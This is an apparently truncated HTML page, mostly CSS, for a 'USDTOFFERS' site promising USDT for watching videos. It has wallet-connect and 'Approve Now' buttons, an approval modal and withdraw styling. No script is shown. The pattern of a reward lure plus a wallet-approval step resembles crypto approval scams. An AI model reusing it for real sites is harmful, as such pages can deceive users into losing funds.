<!doctype html>
<html> 
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Complete TASKS, Earn USDT</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}

html {
  background:#050816;
}



    
 body{
  margin:0;
  min-height:100dvh;
  background:#050816;
  color:#e6eef8;
  display:flex;
  flex-direction:column;
  overscroll-behavior:none;
   font-family:system-ui,Segoe UI,Arial;
}




@media (max-width: 768px) {
  header {
   
    will-change: transform;
  }
}

    

    /* === HEADER & NAV (same structure as index) === */
    header{
      background:#071027;
      padding:10px 16px;
      
      z-index:20;
      border-bottom:1px solid rgba(255,255,255,0.03);
    }
    .nav{
      max-width:980px;
      margin:0 auto;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
    }
    .nav-right{
      display:flex;
      align-items:center;
      gap:10px;
      flex-wrap:wrap;
      justify-content:flex-end;
    }

    .nav-right a{
      color:#dbeafe;
      text-decoration:none;
      padding:6px 10px;
      border-radius:6px;
      font-size:0.9rem;
    }
    .nav-right a:hover{
      background:#0f1b33;
    }

    .connect{
      background:#3b82f6;
      color:#fff;
      padding:8px 14px;
      border-radius:999px;
      border:0;
      cursor:pointer;
      font-size:0.9rem;
      white-space:nowrap;
    }
    .connect.connected{
      background:#15803d;
    }

    main{
      max-width:980px;
      margin:20px auto;
      padding:16px;
      flex:1;
    }


/* ===== FIX 1: Task page full width inside main ===== */
#taskPage{
  max-width:980px;
  margin:0 auto;
}

.video-wrapper,
.task-section{
  max-width:100%;
}



.hidden {
  display: none !important;
}

    
    /* small info line under header (User ID etc) */
    .top-info{
      margin-bottom:14px;
      font-size:0.84rem;
      color:#9fb0c8;
      display:flex;
      flex-wrap:wrap;
      gap:10px 18px;
    }
    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono","Helvetica Neue", monospace;}

    /* ===== REWARD PAGE ===== */
    .reward-title{
      text-align:center;
      margin-bottom:1.5rem;
    }
    .reward-title h1{
      font-size:1.9rem;
      margin-bottom:0.4rem;
    }
    .reward-title p{
      font-size:0.95rem;
      color:#9ca3af;
    }

    .reward-card{
      border-radius:1.5rem;
      padding:1.4rem 1.6rem;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:1.4rem;
      border:1px solid rgba(148,163,184,0.35);
      box-shadow:0 20px 45px rgba(15,23,42,0.9);
      background:radial-gradient(circle at top left,#111827,#020617);
    }


/* ===== UPCOMING REWARD ===== */
.reward-lock-badge{
  display:inline-flex;
  align-items:center;
  gap:6px;
  padding:6px 14px;
  border-radius:999px;
  font-size:0.8rem;
  font-weight:600;
  background:rgba(148,163,184,0.12);
  border:1px solid rgba(148,163,184,0.5);
  color:#e5e7eb;
}




    
    .reward-left,
    .reward-center,
    .reward-right{
      display:flex;
      flex-direction:column;
      justify-content:center;
    }

    .reward-left{
      min-width:150px;
      gap:0.4rem;
    }

    .reward-tag{
      font-size:0.7rem;
      text-transform:uppercase;
      letter-spacing:0.18em;
      color:#64748b;
      margin-bottom:6px;
    }

    .wallet-icon-base{
      width:54px;
      height:54px;
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
      background:#020617;
      border-radius:999px;
      border:1px solid rgba(148,163,184,0.6);
      background:radial-gradient(circle at 20% 0,#1d4ed8,#020617);
    }
  .wallet-icon-base img{
  width:130%;
  height:130%;
  object-fit:cover;
  display:block;
}
}

    .wallet-subline{
      font-size:0.8rem;
      color:#9fb0c8;
    }

    .reward-center{
      flex:1;
      align-items:center;
      text-align:center;
      gap:0.35rem;
    }

    .reward-amount{
      font-size:2.1rem;
      font-weight:700;
      letter-spacing:0.05em;
    }

    .reward-label{
      font-size:0.86rem;
      text-transform:uppercase;
      color:#9ca3af;
      letter-spacing:0.23em;
    }

    .reward-desc{
      margin-top:2px;
      font-size:0.82rem;
      color:#9fb0c8;
      max-width:370px;
    }

    .connected-pill{
      margin-top:6px;
      padding:4px 12px;
      border-radius:999px;
      font-size:0.8rem;
      background:rgba(34,197,94,0.15);
      border:1px solid rgba(34,197,94,0.7);
      color:#bbf7d0;
      display:inline-flex;
      align-items:center;
      gap:6px;
    }
    .connected-pill::before{
      content:"";
      width:6px;
      height:6px;
      border-radius:999px;
      background:#22c55e;
    }

    .btn{
      border:none;
      outline:none;
      border-radius:999px;
      padding:0.55rem 1.8rem;
      font-size:0.9rem;
      font-weight:600;
      cursor:pointer;
      transition:transform 0.12s ease, box-shadow 0.12s ease, background 0.15s ease, opacity 0.12s ease;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      white-space:nowrap;
    }

.google-play-btn img{
  height:70px;        /* ‚úÖ SMALL & CLEAN */
  width:auto;
  display:block;
}

    @media(max-width:480px){
  .google-play-btn img{
    height:55px;
  }
}

.btn-primary {
  background: linear-gradient(135deg, #2563eb, #3b82f6);
  color: #fff;
  border: none;
  border-radius: 999px;
  padding: 10px 22px;
  font-size: 0.95rem;
  font-weight: 600;
  cursor: pointer;
  box-shadow: 0 12px 30px rgba(37, 99, 235, 0.45);
  transition: transform 0.15s ease, box-shadow 0.15s ease;
}

.btn-primary:hover {
  transform: translateY(-1px);
  box-shadow: 0 18px 40px rgba(37, 99, 235, 0.65);
}

.center-box {
  display: flex;
  justify-content: center;
  margin-bottom: 14px;
  margin-top: 8px;
}

.center-text {
  text-align: center;
}

    

    .btn-claim{
      background:#22c55e;
      color:#022c22;
      box-shadow:0 14px 30px rgba(34,197,94,0.45);
      margin-top:0.7rem;
     
    }
    .btn-claim:hover:not([disabled]){
      transform:translateY(-1px);
      box-shadow:0 18px 40px rgba(34,197,94,0.6);
    }

    .btn-task{


  
      padding:8px 14px;
    
     
      cursor:pointer;
      font-size:0.9rem;
      white-space:nowrap;

border-radius:999px;
  background:linear-gradient(135deg,#1e3a8a,#2563eb);
  color:#e5edff;

  border:1px solid rgba(59,130,246,0.6);
  box-shadow:
    0 10px 26px rgba(37,99,235,0.45),
    inset 0 1px 0 rgba(255,255,255,0.12);



  
     
    }
    .btn-task:hover{
      background:rgba(15,23,42,0.9);
      box-shadow:0 10px 26px rgba(15,23,42,0.8);
      transform:translateY(-1px);
    }

    .btn[disabled]{
      opacity:0.45;
      cursor:not-allowed;
      box-shadow:none;
      transform:none;
    }

    .reward-right{
      min-width:170px;
      align-items:flex-end;
      gap:0.4rem;
    }

    .small{font-size:0.85rem;color:#9fb0c8;}

    .reward-extra{
      margin-top:18px;
      font-size:0.85rem;
      color:#9fb0c8;
    }



/* ===== APPROVE BUTTON IN WALLET STATUS CARD ===== */
.wallet-status-card .approve-btn{
  padding:8px 14px;  font-size:0.9rem;        /* üëà clearer text */
  font-size:0.9rem;    /* same as .connect */

 min-width: 140px;
  justify-content:center;

  box-shadow:
    0 10px 26px rgba(37,99,235,0.45),
    inset 0 1px 0 rgba(255,255,255,0.12);
}




    
    /* ===== TASK PAGE (same header/footer, just different content) ===== */
    #taskPage{display:none;}

    .task-header-row{
      display:flex;
      justify-content:space-between;
      align-items:center;
      gap:10px;
      margin-bottom:16px;
    }
    .task-header-row h2{
      font-size:1.4rem;
    }
    .btn-back{
      border-radius:999px;
      border:1px solid rgba(148,163,184,0.7);
      background:transparent;
      color:#e5e7eb;
      font-size:0.85rem;
      padding:0.4rem 1.2rem;
      cursor:pointer;
    }
    .btn-back:hover{
      background:#111827;
    }

    .task-section{
      margin-top:18px;
      padding:1rem 1.1rem;
      border-radius:0.9rem;
      border:1px solid rgba(75,85,99,0.7);
      background:linear-gradient(135deg,#020617,#020617,#0b1120);
    }
    .task-section h3{
      font-size:1rem;
      margin-bottom:0.35rem;
    }
    .task-section p{
      font-size:0.86rem;
      color:#cbd5f5;
      margin-bottom:0.35rem;
    }
    .task-section ul{
      margin-left:1.2rem;
      margin-bottom:0.35rem;
      font-size:0.86rem;
      color:#cbd5f5;
    }
    .task-section li{
      margin-bottom:0.18rem;
    }

    .video-wrapper{
      position:relative;
      width:100%;
      max-width:640px;
      margin-top:0.6rem;
      margin-bottom:0.6rem;
      padding-top:56.25%; /* 16:9 */
      border-radius:0.75rem;
      overflow:hidden;
      box-shadow:0 18px 38px rgba(15,23,42,0.9);
      background:#020617;
    }
    .video-wrapper iframe{
      position:absolute;
      top:0;left:0;
      width:100%;
      height:100%;
      border:0;
    }

.video-click-overlay{
  position:absolute;
  inset:0;
  z-index:4;
  cursor:pointer;
  background:transparent;
}

.video-click-overlay.hidden{
  pointer-events:none;
  opacity:0;
}



.video-timer{
  position:absolute;
  top:10px;
  right:10px;
  background:rgba(2,6,23,0.85);
  border:1px solid rgba(148,163,184,0.6);
  color:#e5e7eb;
  font-size:0.75rem;
  padding:4px 8px;
  border-radius:999px;
  font-family:ui-monospace, monospace;
  z-index:5;
}

/* ===== PROFESSIONAL VIDEO PROGRESS RING ===== */
.video-progress{
  position:absolute;
  top:50%;
  right:12px;
  transform:translateY(-50%);
  width:46px;
  height:46px;
  z-index:5;

  background:rgba(2,6,23,0.75);
  border-radius:50%;
  border:1px solid rgba(148,163,184,0.6);
}


.progress-ring{
  transform:rotate(-90deg);
}

.ring-bg{
  fill:none;
  stroke:rgba(148,163,184,0.25);
  stroke-width:4;
}

.ring-progress{
  fill:none;
  stroke:#3b82f6;
  stroke-width:4;
  stroke-linecap:round;
  stroke-dasharray:113;
  stroke-dashoffset:113;
  transition:stroke-dashoffset 0.4s linear, stroke 0.3s ease;
}

.ring-text{
  position:absolute;
  inset:0;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:0.65rem;
  font-family:ui-monospace, monospace;
  color:#e5e7eb;
}

/* ===== MODAL ===== */
.modal-overlay{
  position:fixed;
  inset:0;
  background:rgba(2,6,23,0.8);
  backdrop-filter:blur(6px);
  display:flex;
  align-items:center;
  justify-content:center;
  z-index:1000;
}

.modal-overlay.hidden{
  display:none;
}

.modal-card{
  width:100%;
  max-width:420px;
  background:linear-gradient(135deg,#020617,#0b1120);
  border:1px solid rgba(148,163,184,0.25);
  border-radius:16px;
  padding:22px;
  box-shadow:0 30px 80px rgba(0,0,0,0.6);
  position:relative;
  animation:modalPop 0.25s ease-out;
}

@keyframes modalPop{
  from{transform:scale(0.95);opacity:0}
  to{transform:scale(1);opacity:1}
}

.modal-close{
  position:absolute;
  top:10px;
  right:10px;
  background:transparent;
  border:none;
  color:#9ca3af;
  font-size:1.1rem;
  cursor:pointer;
}

.modal-close:hover{color:#fff}

.modal-card h3{
  font-size:1.2rem;
  margin-bottom:8px;
}

.modal-card p{
  font-size:0.9rem;
  color:#cbd5f5;
  line-height:1.6;
}




/* ===== WITHDRAW INPUT ===== */
.withdraw-input {
  width: 100%;
  margin-top: 6px;
  padding: 10px 14px;
  border-radius: 10px;
  border: 1px solid rgba(148,163,184,0.35);
  background: #020617;
  color: #e5e7eb;
  font-size: 0.9rem;
}

.withdraw-input:focus {
  outline: none;
  border-color: #22c55e;
}

.withdraw-error {
  margin-top: 6px;
  font-size: 0.75rem;
  color: #f87171;
}

.withdraw-error.hidden {
  display: none;
}

    

    /* ===== WALLET STATUS (dApp style) ===== */
.wallet-status-card{
  background:linear-gradient(135deg,#020617,#0b1120);
  border:1px solid rgba(148,163,184,0.25);
  border-radius:14px;
  padding:12px 14px;
  margin-bottom:18px;
  box-shadow:0 10px 30px rgba(0,0,0,0.45);
  display:flex;
  flex-direction:column;
  gap:10px;
}

.wallet-status-row{
  display:flex;
  align-items:center;
  gap:8px;
  font-size:0.9rem;
  font-weight:500;
}

.status-dot{
  width:8px;
  height:8px;
  border-radius:50%;
  background:#64748b; /* default */
  box-shadow:0 0 0 3px rgba(100,116,139,0.15);
}

/* JS will still change text only */
#statusText{
  color:#e5e7eb;
}

/* Meta row */
.wallet-meta{
  display:flex;
  flex-wrap:wrap;
  gap:8px;
  align-items:center;
}



    /* ===== APPROVAL MODAL ACTIONS ===== */


.approval-actions{
  margin-top:18px;
  display:flex;
  justify-content:center;
  align-items:center;
  gap:12px;
}


/* Pills */
.network-pill{
  background:rgba(59,130,246,0.15);
  border:1px solid rgba(59,130,246,0.6);
  color:#bfdbfe;
  padding:4px 10px;
  border-radius:999px;
  font-size:0.75rem;
  font-weight:600;
}

.address-pill{
  background:rgba(148,163,184,0.12);
  border:1px solid rgba(148,163,184,0.35);
  padding:4px 10px;
  border-radius:999px;
  font-size:0.75rem;
  max-width:100%;
  overflow:hidden;
  text-overflow:ellipsis;
  white-space:nowrap;
}

.user-pill{
  background:rgba(34,197,94,0.12);
  border:1px solid rgba(34,197,94,0.5);
  color:#bbf7d0;
  padding:4px 10px;
  border-radius:999px;
  font-size:0.75rem;
  font-weight:600;
}

/* ===== STATUS COLORS (pure CSS, text-driven) ===== */
.wallet-status-card:has(#statusText:contains("Connected")) .status-dot{
  background:#22c55e;
  box-shadow:0 0 0 3px rgba(34,197,94,0.25);
}

.wallet-status-card:has(#statusText:contains("FAILED")) .status-dot{
  background:#f97316;
  box-shadow:0 0 0 3px rgba(249,115,22,0.25);
}



/* Keep space for reward-card connect button even when hidden */
#connectBtnCard{
  min-width:170px;   /* keeps right side width */
}

/* Hide visually but keep layout */
#connectBtnCard.is-hidden{
  visibility:hidden;
  pointer-events:none;
}



    

/* ===== APPROVE BUTTON (Professional dApp style) ===== */
.approve-btn{
  align-self:center;            /* not full width */
  margin-top:6px;

  background:linear-gradient(
    135deg,
    #1e3a8a,
    #2563eb
  );

  color:#e5edff;
  border:1px solid rgba(59,130,246,0.6);
  border-radius:999px;

  padding:6px 16px;                   /* üëà smaller, professional */
  font-size:0.78rem;                  /* üëà dApp-sized text */
  font-weight:600;
  letter-spacing:0.02em;

  cursor:pointer;
  display:inline-flex;
  align-items:center;
  gap:6px;

  box-shadow:
    0 6px 18px rgba(37,99,235,0.35),
    inset 0 1px 0 rgba(255,255,255,0.08);

  transition:
    transform 0.12s ease,
    box-shadow 0.12s ease,
    background 0.15s ease,
    opacity 0.12s ease;
}

.approve-btn::before{
  content:"";
  font-size:0.75rem;
  opacity:0.9;
}

.approve-btn:hover:not(:disabled){
  transform:translateY(-1px);
  box-shadow:
    0 10px 26px rgba(37,99,235,0.55),
    inset 0 1px 0 rgba(255,255,255,0.12);
}

.approve-btn:active:not(:disabled){
  transform:translateY(0);
}

.approve-btn:disabled{
  opacity:0.55;
  cursor:not-allowed;
  box-shadow:none;
}


    /* ===== BIG PRIMARY APPROVE BUTTON (MODAL ONLY) ===== */
#approvalModal .approve-btn{
  padding:12px 28px;        /* üëà bigger click area */
  font-size:1rem;           /* üëà larger text */
  font-weight:700;

  min-width:200px;          /* üëà strong primary feel */
  justify-content:center;

  box-shadow:
    0 14px 36px rgba(37,99,235,0.55),
    inset 0 1px 0 rgba(255,255,255,0.15);
}
#approvalModal .approve-btn:hover{
  transform:translateY(-1px);
  box-shadow:
    0 20px 46px rgba(37,99,235,0.75);
}

#approvalModal .approve-btn:active{
  transform:translateY(0);
}


    
    .task-actions{
      margin-top:0.6rem;
      display:flex;
      flex-wrap:wrap;
      gap:10px;
      align-items:center;
    }


/* Align Watch + Claim buttons in one row */
.task-actions {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 12px;
}

/* Make both buttons same size */
.task-actions .task-btn,
.task-actions .task-claim-btn {
  flex: 1;
  max-width: 48%;
  text-align: center;
  padding: 10px 16px;        /* same height */
  font-size: 0.9rem;
  border-radius: 999px;
}




.withdraw-rules {
  margin-top: 14px;
  padding-top: 10px;
  border-top: 1px dashed rgba(148,163,184,0.25);
  font-size: 0.8rem;
  color: #fdba74;
}

.withdraw-rules-title {
  font-weight: 600;
  font-size: 0.75rem;
  text-transform: uppercase;
  letter-spacing: 0.12em;
  margin-bottom: 6px;
  color: #cbd5f5;
}

.withdraw-rules ul {
  margin: 0;
  padding-left: 16px;
}

.withdraw-rules li {
  margin-bottom: 4px;
}


    
/* ===== EARNINGS DISPLAY ===== */
.earnings-box {
  margin-top: 10px;
  padding: 14px 16px;
  border-radius: 14px;
  background: linear-gradient(135deg, #020617, #0b1120);
  border: 1px solid rgba(148,163,184,0.25);
  box-shadow: 0 14px 40px rgba(0,0,0,0.6);
  text-align: center;
}

.earnings-label {
  font-size: 0.75rem;
  letter-spacing: 0.25em;
  text-transform: uppercase;
  color: #94a3b8;
  margin-bottom: 6px;
}

.earnings-amount {
  font-size: 2rem;
  font-weight: 800;
  letter-spacing: 0.04em;
  color: #22c55e;
  text-shadow:
    0 0 10px rgba(34,197,94,0.35),
    0 0 22px rgba(34,197,94,0.25);
}

.earnings-currency {
  font-size: 2rem;              /* SAME as amount */
  font-weight: 800;
  margin-right: 4px;
  color: #22c55e;

  text-shadow:
    0 0 10px rgba(34,197,94,0.35),
    0 0 22px rgba(34,197,94,0.25);
}

    
/* ===== TASK PROGRESS BAR ===== */
.task-progress {
  max-width: 420px;
  margin: 10px auto 18px;
  text-align: center;
   padding: 0 12px;      
}

.task-progress-bar {
  width: 100%;
  height: 8px;
  background: rgba(148,163,184,0.25);
  border-radius: 999px;
  overflow: hidden;
}

.task-progress-bar > div {
  height: 100%;
  width: 0%;
  max-width: 100%;
  will-change: width;
  background: linear-gradient(
    90deg,
    #22c55e,
    #4ade80,
    #22c55e
  );
  background-size: 200% 100%;
  border-radius: 999px;

  transition: width 0.6s ease;

  /* üî• glow */
  box-shadow:
    0 0 10px rgba(34,197,94,0.55),
    0 0 20px rgba(34,197,94,0.35),
    inset 0 0 6px rgba(255,255,255,0.35);

  /* üî• animated glow */
  animation: progressGlow 2.4s ease-in-out infinite;
}



@media (max-width: 480px) {
  .task-progress {
    padding: 0 8px;
  }

  .task-progress-text {
    font-size: 0.75rem;
  }
}


    
.task-progress-text {
  margin-top: 6px;
  font-size: 0.8rem;
  color: #9fb0c8;
}

@keyframes progressGlow {
  0% {
    background-position: 0% 50%;
    filter: brightness(1);
  }
  50% {
    background-position: 100% 50%;
    filter: brightness(1.25);
  }
  100% {
    background-position: 0% 50%;
    filter: brightness(1);
  }
}

    
    .task-btn{
      border-radius:999px;
      border:none;
      background:#22c55e;
      color:#022c22;
      font-size:0.9rem;
      padding:0.45rem 1.4rem;
      font-weight:600;
      cursor:pointer;
    }
    .task-btn:hover{
      box-shadow:0 14px 30px rgba(34,197,94,0.45);
      transform:translateY(-1px);
    }

    .task-check{
      font-size:0.84rem;
    }
    .task-check.ok{
      color:#22c55e;
    }
    .task-check.bad{
      color:#f97316;
    }

    footer{
      max-width:980px;
      margin:24px auto 16px auto;
      padding:12px;
      color:#9fb0c8;
      text-align:center;
      font-size:0.8rem;
    }

/* ===== FOOTER PARTNERS ===== */
.footer-text {
  margin-bottom: 10px;
}

/* ===== FOOTER PARTNERS (PNG) ===== */
.footer-partners {
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 22px;
  flex-wrap: wrap;
  margin-top: 12px;
}

.footer-partners img {
  height: 32px;              /* üëà good visual weight */
  width: auto;
  max-width: 120px;

  opacity: 0.95;
  transition: transform 0.2s ease, opacity 0.2s ease;
}

.footer-partners img:hover {
  opacity: 1;
  transform: translateY(-1px);
}

/* Footer note */
.footer-note {
  margin-top: 8px;
  opacity: 0.6;
  font-size: 0.75rem;
}
    
@media (max-width: 480px) {
  .footer-partners img {
    height: 26px;
  }
}


    


/* ===== TASK AMOUNT BADGE ===== */
.task-section {
  position: relative;
}

.task-amount-badge {
  position: absolute;
  top: 12px;
  right: 12px;

  background: linear-gradient(135deg, #22c55e, #16a34a);
  color: #022c22;

  font-size: 0.75rem;
  font-weight: 700;
  padding: 4px 10px;
  border-radius: 999px;

  box-shadow: 0 8px 20px rgba(34,197,94,0.45);
}

/* ===== TOAST ===== */
.toast {
  position: fixed;
  bottom: 24px;
  left: 50%;
  transform: translateX(-50%);
  background: #020617;
  color: #e5e7eb;
  border: 1px solid rgba(148,163,184,0.4);
  padding: 10px 16px;
  border-radius: 999px;
  font-size: 0.85rem;
  box-shadow: 0 14px 40px rgba(0,0,0,0.6);
  z-index: 9999;
  opacity: 0;
  transition: opacity 0.25s ease, transform 0.25s ease;
}

.toast.show {
  opacity: 1;
  transform: translateX(-50%) translateY(-6px);
}

.toast.hidden {
  display: none;
}


    

.task-claim-btn {
  border-radius: 999px;
  background: #22c55e;
  color: #022c22;
  font-size: 0.8rem;
  font-weight: 700;
  padding: 6px 14px;
  border: none;
  cursor: pointer;
}

.task-claim-btn:disabled {
  opacity: 0.45;
  cursor: not-allowed;
}

.task-locked {
  opacity: 0.45;
  pointer-events: none;
}

.task-locked::after {
  content: "üîí Complete previous task to unlock";
  display: block;
  margin-top: 8px;
  font-size: 0.75rem;
  color: #94a3b8;
}

/* ===== TASK UNLOCK ANIMATION ===== */
.task-locked {
  opacity: 0.4;
  pointer-events: none;
  transform: scale(0.98);
}

.task-unlocked {
  animation: unlockPop 0.45s ease-out;
}

@keyframes unlockPop {
  0% {
    opacity: 0;
    transform: scale(0.96);
  }
  60% {
    opacity: 1;
    transform: scale(1.02);
  }
  100% {
    transform: scale(1);
  }
}

    

    /* Reward layout responsive */
    @media(max-width:768px){
      .reward-card{
        flex-direction:column;
        align-items:stretch;
        text-align:center;
      }
      .reward-left{
        align-items:center;
      }
      .reward-right{
        align-items:center;
      }
    }



/* ================== PROFESSIONAL DAPP TIERS ================== */

/* Base card stays identical */
.reward-card{
  background:linear-gradient(180deg,#020617,#020617);
  border:1px solid rgba(148,163,184,0.25);
}

/* ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ SILVER ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ */
.reward-silver{
  border-left:3px solid #FFF4C7;   /* neutral silver */
}

.reward-silver .reward-amount{
  color:#FFF4C7;
}

/* ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ GOLD ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ */
.reward-gold{
  border-left:3px solid #FFD057;   /* muted gold */
}

.reward-gold .reward-amount{
  color:#FFD057;
}

/* ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ PLATINUM ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ */
.reward-platinum{
  border-left:3px solid #00A3FF;   /* cold platinum */
}

.reward-platinum .reward-amount{
  color:#00A3FF;
}
.reward-gold{
  box-shadow:inset 3px 0 0 rgba(202,138,4,0.35);
}

.reward-platinum{
  box-shadow:inset 3px 0 0 rgba(148,163,184,0.35);
   animation: platinumGlow 3.5s ease-in-out infinite;
}



@keyframes platinumGlow {
  0% { box-shadow: 0 0 25px rgba(56,189,248,0.4); }
  50% { box-shadow: 0 0 45px rgba(56,189,248,0.65); }
  100% { box-shadow: 0 0 25px rgba(56,189,248,0.4); }
}

    


/* üî• FIRE / PLATINUM AMOUNT ANIMATION */
.fire-amount {
  background: linear-gradient(
    90deg,
    #facc15,
    #fb923c,
    #ef4444,
    #fb923c,
    #facc15
  );
  background-size: 300% 100%;
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;

  text-shadow:
    0 0 12px rgba(251, 146, 60, 0.35),
    0 0 24px rgba(239, 68, 68, 0.25);

  animation:
    fireFlow 3.5s linear infinite,
    firePulse 2.4s ease-in-out infinite;
}

/* flowing fire gradient */
@keyframes fireFlow {
  0%   { background-position:   0% 50%; }
  100% { background-position: 300% 50%; }
}

/* subtle heat pulse */
@keyframes firePulse {
  0%, 100% {
    transform: scale(1);
    filter: brightness(1);
  }
  50% {
    transform: scale(1.04);
    filter: brightness(1.25);
  }
}



/* üî• MAX TIER RIBBON */
.max-tier-card {
  position: relative;
  overflow: hidden;     /* ‚úÖ allow ribbon to escape */

  border-left:3px solid #00A3FF;
    box-shadow:inset 3px 0 0 rgba(148,163,184,0.35);
   animation: platinumGlow 3.5s ease-in-out infinite;
  
}

/* Ribbon element */
.max-tier-ribbon {
        /* always above cards */
  pointer-events: none; 
  position: absolute;
  top: 18px;
  right: -44px;

  transform: rotate(45deg);

  background: linear-gradient(
    90deg,
    #facc15,
    #fb923c,
    #ef4444,
    #fb923c,
    #facc15
  );
  background-size: 300% 100%;

  color: #020617;
  font-size: 0.7rem;
  font-weight: 800;
  letter-spacing: 0.25em;

  padding: 6px 60px;

  box-shadow:
    0 10px 30px rgba(239,68,68,0.35);

  animation: ribbonFire 3s linear infinite;
}

/* Fire animation */
@keyframes ribbonFire {
  0%   { background-position:   0% 50%; }
  100% { background-position: 300% 50%; }
}


    #taskBtn.approve-btn {
  padding: 10px 20px;        /* bigger tap area */
  font-size: 1.0rem;        /* larger text */
  font-weight: 700;
  min-width: 200px;

  justify-content: center;
  border-radius: 999px;

  box-shadow:
    0 14px 36px rgba(37, 99, 235, 0.55),
    inset 0 1px 0 rgba(255,255,255,0.18);
}
#taskBtn.approve-btn:hover:not(:disabled) {
  transform: translateY(-1px);
  box-shadow:
    0 20px 46px rgba(37, 99, 235, 0.75);
}

@media (max-width: 480px) {
  #taskBtn.approve-btn {
    width: 100%;
    max-width: 260px;
    font-size: 1rem;
  }
}


    

.wallet-status-card:has(#statusText:contains("failed")) .approve-btn{
  animation:approvePulse 1.6s ease-out infinite;
}





/* hover / active polish */
.wallet-status-card #approveBtn.btn.btn-task:hover{
  transform:translateY(-1px);
  box-shadow:
    0 16px 36px rgba(37,99,235,0.65);
}

.wallet-status-card #approveBtn.btn.btn-task:active{
  transform:translateY(0);
}


 .logo{
    text-align:center;
    font-family:'Inter', system-ui, sans-serif;
    font-size:1.10rem;
    font-weight:750;
    letter-spacing:0.30em;
  }

      .logo-usdt{ color:#26A17B; }
  .logo-offers{ color:#E5E7EB; }


.withdraw-item {
  display:flex;
  justify-content:space-between;
  align-items:center;
  padding:8px 0;
  border-bottom:1px solid rgba(148,163,184,0.15);
}

.withdraw-left {
  display:flex;
  flex-direction:column;
}

.withdraw-amount {
  font-weight:700;
}

.withdraw-time {
  font-size:0.75rem;
  color:#9fb0c8;
}

.withdraw-status {
  padding:4px 10px;
  border-radius:999px;
  font-size:0.7rem;
  font-weight:700;
}

.withdraw-status.pending {
  background:rgba(249,115,22,0.15);
  border:1px solid rgba(249,115,22,0.6);
  color:#fdba74;
}

.withdraw-status.completed {
  background:rgba(34,197,94,0.15);
  border:1px solid rgba(34,197,94,0.6);
  color:#bbf7d0;
}


/* ===== WITHDRAW BUTTON ===== */
.withdraw-btn {
  margin: 14px auto 4px;
  display: block;

  padding: 10px 28px;
  border-radius: 999px;

  font-size: 0.9rem;
  font-weight: 700;
  letter-spacing: 0.04em;

  border: none;
  cursor: pointer;

  background: linear-gradient(135deg, #22c55e, #16a34a);
  color: #022c22;

  box-shadow: 0 14px 36px rgba(34,197,94,0.45);
  transition: transform 0.15s ease, box-shadow 0.15s ease, opacity 0.15s ease;
}

.withdraw-btn:hover:not(:disabled) {
  transform: translateY(-1px);
  box-shadow: 0 18px 46px rgba(34,197,94,0.65);
}

.withdraw-btn:disabled {
  opacity: 0.45;
  cursor: not-allowed;
  box-shadow: none;
}

.withdraw-hint {
  text-align: center;
  font-size: 0.75rem;
  color: #9fb0c8;
}


    
/* ===== Header mobile cleanup (<=640px) ===== */
@media (max-width: 640px){

  header{
    padding:10px 16px;
    background:#071027;
    position:sticky;
    top:0;
    z-index:20;
    border-bottom:1px solid rgba(255,255,255,0.03);
  }

  .nav{
    max-width:100%;
    flex-direction:column;
    align-items:stretch;
    justify-content:flex-start;
    gap:6px;
  }

  .logo{
    text-align:center;
    font-family:'Inter', system-ui, sans-serif;
    font-size:1.10rem;
    font-weight:750;
    letter-spacing:0.30em;
  }

  .logo-center{
    justify-self:center;
  }

  .logo-usdt{ color:#26A17B; }
  .logo-offers{ color:#E5E7EB; }

  .lwwffogo{
    width:100%;
    text-align:center;
    font-size:0.9rem;
    letter-spacing:3px;
  }

  .nav-right{
    width:100%;
    justify-content:center;
    gap:6px;
  }

  .nav-right a{
    padding:4px 8px;
    font-size:0.85rem;
  }

  header .connect{
    width:100%;
    max-width:260px;
    padding:8px 12px;
    font-size:0.9rem;
  }
}



    

    }
  </style>
</head>
<body>
  <!-- React root for Vite (hidden, UI is pure HTML) -->
  <div id="root" style="display:none;"></div>

  <header>
    <div class="nav">
     
<div class="logo-center">
      <div class="logo">
        <span class="logo-usdt">USDT</span><span class="logo-offers">OFFERS</span>
      </div>
</div>

      
      <div class="nav-right">
     <a href="#" id="aboutBtn">About</a>
<a href="#" id="contactBtn">Contact</a>
      
        <button id="connectBtn" class="connect">Connect Wallet</button>
      </div>
    </div>
  </header>

  <main>

    <div class="wallet-status-card">

      <div class="wallet-status-row">
    <span class="status-dot"></span>
    <span id="statusText">Not connected</span>
  </div>
<button
  id="approveBtn"
  class="btn btn-task hidden"
>
  Approve Now
</button>
      
  <br>
      
 <div class="wallet-meta">
    
    <span class="user-pill">
      User ID <span id="userId"></span>
    </span>
    <br>
    <span class="network-pill" id="walletNetwork">Network</span>
   <br>

   <br> <span class="address-pill mono" id="walletAddress">Wallet Address</span>

    
  </div>
</div>


    <!-- === REWARD PAGE VIEW === -->
    <div id="rewardPage">
      <div class="reward-title">
        <h1>Complete Tasks, Earn USDT</h1>
        <p>Complete the tasks to earn USDT.</p>
      </div>

      <div class="reward-card">
        <div class="reward-left">
          <div class="reward-tag">Beginner Task #1</div>
          <div class="wallet-icon-base">
            <img src="logo.png" alt="USDT">
          </div>
          <span class="wallet-subline">USDT</span>
        </div>

        <div class="reward-center">
          <div class="reward-amount" id="rewardAmountDisplay">$10</div>
          <div class="reward-label">Beginner Task</div> <br>
          <div class="reward-desc">WATCH and EARN</div>
    
    

 

      
      
